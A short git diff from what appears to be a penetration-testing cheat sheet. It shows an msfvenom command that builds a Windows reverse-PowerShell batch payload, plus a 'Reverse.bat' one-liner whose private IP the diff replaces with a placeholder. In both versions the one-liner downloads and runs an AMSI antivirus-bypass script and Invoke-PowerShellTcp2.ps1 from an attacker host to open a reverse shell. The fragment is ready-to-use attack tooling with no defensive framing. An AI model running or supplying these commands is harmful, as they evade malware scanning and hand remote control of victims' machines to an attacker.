@@ -527,6 +527,6 @@ msfvenom -p cmd/windows/reverse_powershell LHOST=<HOST> LPORT=<PORT> > attach.ba
 
 #### Reverse.bat
 ```
-powershell.exe -c "iex (New-Object Net.WebClient).DownloadString('http://172.16.25.10:8090/amsi.txt'); iex (New-Object Net.WebClient).DownloadString('http://172.16.25.10:8090/Invoke-PowerShellTcp2.ps1')"
+powershell.exe -c "iex (New-Object Net.WebClient).DownloadString('http://<IP>/amsi.txt'); iex (New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp2.ps1')"
 ```
  
